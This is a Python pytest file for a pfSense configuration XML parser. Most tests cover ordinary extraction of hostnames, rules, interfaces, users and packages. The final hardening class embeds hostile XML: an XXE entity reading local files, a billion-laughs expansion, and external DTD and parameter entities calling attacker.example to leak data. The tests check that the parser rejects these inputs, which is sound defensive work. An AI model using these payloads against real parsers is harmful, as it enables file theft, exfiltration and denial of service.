"""Tests for pfSense XML config parsing utilities."""

from __future__ import annotations

import pytest

from pfsentinel.utils.xml_parser import (
    PfSenseXMLError,
    count_rules,
    extract_info,
    extract_sections,
    list_interfaces,
    list_packages,
    list_users,
    validate_xml,
)


class TestValidateXml:
    def test_empty_string_raises(self):
        with pytest.raises(PfSenseXMLError, match="empty"):
            validate_xml("")

    def test_whitespace_only_raises(self):
        with pytest.raises(PfSenseXMLError, match="empty"):
            validate_xml("   \n\t  ")

    def test_malformed_xml_raises(self):
        with pytest.raises(PfSenseXMLError, match="parse error"):
            validate_xml("<broken")

    def test_wrong_root_element_raises(self):
        xml = "<notpfsense><system/></notpfsense>"
        with pytest.raises(PfSenseXMLError, match="Root element.*notpfsense"):
            validate_xml(xml)

    def test_missing_system_raises(self):
        xml = "<pfsense><interfaces/></pfsense>"
        with pytest.raises(PfSenseXMLError, match="Missing required <system>"):
            validate_xml(xml)

    def test_valid_xml_returns_element(self, sample_xml):
        root = validate_xml(sample_xml)
        assert root.tag == "pfsense"


class TestExtractInfo:
    def test_full_info_with_domain(self, sample_xml):
        info = extract_info(sample_xml)
        assert info["hostname"] == "home-fw"
        assert info["domain"] == "localdomain"
        assert info["fqdn"] == "home-fw.localdomain"
        assert info["version"] == "24.03"
        assert info["pfsense_version"] == "24.03"

    def test_hostname_only_no_domain(self):
        xml = '<?xml version="1.0"?><pfsense><system><hostname>fw</hostname></system></pfsense>'
        info = extract_info(xml)
        assert info["hostname"] == "fw"
        assert info["domain"] is None
        assert info["fqdn"] == "fw"

    def test_missing_hostname(self):
        xml = '<?xml version="1.0"?><pfsense><system></system></pfsense>'
        info = extract_info(xml)
        assert info["hostname"] is None
        assert info["fqdn"] is None

    def test_empty_hostname_text(self):
        xml = '<?xml version="1.0"?><pfsense><system><hostname>  </hostname></system></pfsense>'
        info = extract_info(xml)
        assert info["hostname"] is not None


class TestExtractSections:
    def test_returns_top_level_sections(self, sample_xml):
        sections = extract_sections(sample_xml)
        assert "system" in sections
        assert "interfaces" in sections
        assert "filter" in sections

    def test_section_values_are_strings(self, sample_xml):
        sections = extract_sections(sample_xml)
        for key, val in sections.items():
            assert isinstance(val, str)
            assert key in val or val.startswith("<")


class TestCountRules:
    def test_counts_existing_rules(self, sample_xml):
        assert count_rules(sample_xml) == 1

    def test_no_filter_section_returns_zero(self):
        xml = '<?xml version="1.0"?><pfsense><system></system></pfsense>'
        assert count_rules(xml) == 0

    def test_multiple_rules(self):
        xml = (
            '<?xml version="1.0"?><pfsense><system></system>'
            "<filter>"
            "<rule><type>pass</type></rule>"
            "<rule><type>block</type></rule>"
            "<rule><type>reject</type></rule>"
            "</filter></pfsense>"
        )
        assert count_rules(xml) == 3


class TestListInterfaces:
    def test_lists_interface_names(self, sample_xml):
        result = list_interfaces(sample_xml)
        assert "wan" in result
        assert "lan" in result

    def test_no_interfaces_section(self):
        xml = '<?xml version="1.0"?><pfsense><system></system></pfsense>'
        assert list_interfaces(xml) == []


class TestListUsers:
    def test_extracts_usernames(self):
        xml = (
            '<?xml version="1.0"?><pfsense><system>'
            "<user><name>admin</name></user>"
            "<user><name>operator</name></user>"
            "</system></pfsense>"
        )
        result = list_users(xml)
        assert result == ["admin", "operator"]

    def test_no_users_returns_empty(self, sample_xml):
        assert list_users(sample_xml) == []

    def test_filters_empty_names(self):
        xml = (
            '<?xml version="1.0"?><pfsense><system>'
            "<user><name>admin</name></user>"
            "<user><name></name></user>"
            "<user></user>"
            "</system></pfsense>"
        )
        result = list_users(xml)
        assert result == ["admin"]


class TestListPackages:
    def test_extracts_package_names(self):
        xml = (
            '<?xml version="1.0"?><pfsense><system></system>'
            "<installedpackages>"
            "<package><name>pfblocker</name></package>"
            "<package><name>suricata</name></package>"
            "</installedpackages></pfsense>"
        )
        result = list_packages(xml)
        assert result == ["pfblocker", "suricata"]

    def test_no_packages_section(self):
        xml_no_pkg = '<?xml version="1.0"?><pfsense version="24.03"><system><hostname>t</hostname></system></pfsense>'
        assert list_packages(xml_no_pkg) == []

    def test_filters_empty_names(self):
        xml = (
            '<?xml version="1.0"?><pfsense><system></system>'
            "<installedpackages>"
            "<package><name>haproxy</name></package>"
            "<package><name></name></package>"
            "<package></package>"
            "</installedpackages></pfsense>"
        )
        result = list_packages(xml)
        assert result == ["haproxy"]


class TestXxeHardening:
    """Parsing must reject hostile XML.

    pfSense config.xml arrives over the network from a device pfSentinel does
    not control, so every one of these is reachable by an attacker who controls
    (or MITMs) the firewall's response.
    """

    def test_classic_xxe_file_read_rejected(self, tmp_path):
        """An external SYSTEM entity must not read local files."""
        secret = tmp_path / "secret.txt"
        secret.write_text("TOP-SECRET-CONTENTS")

        payload = f"""<?xml version="1.0"?>
        <!DOCTYPE pfsense [
          <!ENTITY xxe SYSTEM "file://{secret}">
        ]>
        <pfsense><system><hostname>&xxe;</hostname></system></pfsense>"""

        with pytest.raises(PfSenseXMLError) as exc:
            validate_xml(payload)
        assert "XXE" in str(exc.value) or "DOCTYPE" in str(exc.value)

    def test_file_contents_never_leak_via_extract_info(self, tmp_path):
        """Even if parsing changed, the secret must never reach the output."""
        secret = tmp_path / "secret.txt"
        secret.write_text("TOP-SECRET-CONTENTS")

        payload = f"""<?xml version="1.0"?>
        <!DOCTYPE pfsense [
          <!ENTITY xxe SYSTEM "file://{secret}">
        ]>
        <pfsense><system><hostname>&xxe;</hostname><domain>x</domain></system></pfsense>"""

        with pytest.raises(PfSenseXMLError):
            info = extract_info(payload)
            assert "TOP-SECRET-CONTENTS" not in str(info)  # pragma: no cover

    def test_billion_laughs_rejected(self):
        """Recursive entity expansion must not be attempted."""
        payload = """<?xml version="1.0"?>
        <!DOCTYPE pfsense [
          <!ENTITY lol "lol">
          <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
          <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
          <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
          <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
        ]>
        <pfsense><system><hostname>&lol4;</hostname></system></pfsense>"""

        with pytest.raises(PfSenseXMLError):
            validate_xml(payload)

    def test_external_dtd_rejected(self):
        """A SYSTEM DTD reference must not be fetched."""
        payload = """<?xml version="1.0"?>
        <!DOCTYPE pfsense SYSTEM "http://attacker.example/evil.dtd">
        <pfsense><system><hostname>fw</hostname></system></pfsense>"""

        with pytest.raises(PfSenseXMLError) as exc:
            validate_xml(payload)
        assert "XXE" in str(exc.value) or "DOCTYPE" in str(exc.value)

    def test_network_entity_rejected(self):
        """A http:// SYSTEM entity must not trigger a network fetch."""
        payload = """<?xml version="1.0"?>
        <!DOCTYPE pfsense [
          <!ENTITY xxe SYSTEM "http://attacker.example/leak">
        ]>
        <pfsense><system><hostname>&xxe;</hostname></system></pfsense>"""

        with pytest.raises(PfSenseXMLError):
            validate_xml(payload)

    def test_parameter_entity_rejected(self):
        """Blind-XXE style parameter entities must be rejected."""
        payload = """<?xml version="1.0"?>
        <!DOCTYPE pfsense [
          <!ENTITY % ext SYSTEM "http://attacker.example/evil.dtd">
          %ext;
        ]>
        <pfsense><system><hostname>fw</hostname></system></pfsense>"""

        with pytest.raises(PfSenseXMLError):
            validate_xml(payload)

    def test_harmless_doctype_also_rejected(self):
        """Any DTD is refused, even a benign one - fail closed, not open."""
        payload = """<?xml version="1.0"?>
        <!DOCTYPE pfsense>
        <pfsense><system><hostname>fw</hostname></system></pfsense>"""

        with pytest.raises(PfSenseXMLError) as exc:
            validate_xml(payload)
        assert "DOCTYPE" in str(exc.value)

    def test_legitimate_config_still_parses(self, sample_xml):
        """The hardening must not reject valid pfSense configs."""
        root = validate_xml(sample_xml)
        assert root.tag == "pfsense"

    def test_xml_comments_do_not_become_sections(self):
        """Comments/PIs must not leak into extract_sections output."""
        payload = """<?xml version="1.0"?>
        <pfsense>
          <!-- a comment -->
          <?some-pi data?>
          <system><hostname>fw</hostname></system>
        </pfsense>"""

        sections = extract_sections(payload)
        assert list(sections) == ["system"]
